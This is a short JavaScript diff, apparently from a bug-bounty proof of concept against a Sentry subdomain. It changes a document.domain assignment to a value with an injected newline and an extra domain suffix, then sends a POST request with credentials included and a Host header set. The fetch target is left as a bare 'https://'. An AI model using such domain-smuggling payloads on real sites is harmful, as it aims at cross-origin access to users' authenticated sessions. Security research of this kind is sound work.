@@ -6,7 +6,7 @@
       let headers = {};
       //for (let i = 0; i <= 0x10fff; i++) {
         try {
-          document.domain = "hackerone1.sentry.io"
+          document.domain = "hackerone1.sentry.io.%0a\n.section.app"
           fetch("https://", { method: 'POST', credentials: "include", Host:"hackerone1.sentry.io"}).then(resp => console.log(resp.text()))
         } catch (e) { console.log(e) }
       }
